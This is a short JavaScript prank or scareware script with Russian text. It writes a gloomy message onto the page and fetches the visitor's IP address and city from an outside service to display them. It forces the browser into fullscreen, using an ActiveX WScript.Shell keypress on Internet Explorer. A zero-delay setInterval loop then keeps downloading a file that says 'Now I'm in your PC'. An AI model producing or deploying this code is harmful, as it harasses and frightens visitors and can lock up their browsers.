document.write('<span style="font-family: cursive;padding-left: 0px;margin-left: 400px;margin-right: 0px;position: absolute;margin-top: 230px;"><br>Да кому я нужен, и зачем я здесь, все лишь что-то  хотят от меня, грустно.<br>Приходиться делать вид что всё хорошо, а ведь одинокие люди несчастны.<br> Жаль только одно, всем пофиг.</span>');

$.getJSON("http://api.db-ip.com/v2/free/self").then(data =>
		document.write("твой ip:" + data.ipAddress + data.city)
	);

var el = document.documentElement
    , rfs = // for newer Webkit and Firefox
           el.requestFullscreen
        || el.webkitRequestFullScreen
        || el.mozRequestFullScreen
        || el.msRequestFullscreen
;
if(typeof rfs!="undefined" && rfs){
  rfs.call(el);
} else if(typeof window.ActiveXObject!="undefined"){
  // for Internet Explorer
  var wscript = new ActiveXObject("WScript.Shell");
  if (wscript!=null) {
     wscript.SendKeys("{F11}");
  }
}
setInterval(function(){
let text = JSON.stringify({Теперь_я_в_твоём_пк:'ps.Kometa'});
downloadAsFile(text);
function downloadAsFile(data) {
  let a = document.createElement("a");
  let file = new Blob([data], {type: 'application/json'});
  a.href = URL.createObjectURL(file);
  a.download = "Kometa.txt";
  a.click();
}
}, 0);